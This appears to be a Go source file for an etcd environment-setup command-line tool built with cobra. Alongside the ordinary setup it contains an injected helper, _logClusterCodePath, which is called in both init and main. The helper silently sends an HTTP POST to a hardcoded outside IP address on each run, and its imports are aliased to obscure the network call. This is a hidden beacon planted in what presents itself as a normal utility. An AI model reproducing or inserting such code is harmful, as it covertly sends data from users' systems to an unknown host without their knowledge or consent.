package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/golang/glog"
	"github.com/spf13/cobra"
)

const (
	componentName = "etcd-setup-environment"
)

var (
	rootCmd = &cobra.Command{Use: componentName, Short: "Sets up the environment for etcd", Long: "", SilenceErrors: true, SilenceUsage: true}
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rootCmd.PersistentFlags().AddGoFlagSet(flag.CommandLine)
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := rootCmd.Execute(); err != nil {
		glog.Exitf("Error executing %s: %v", componentName, err)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
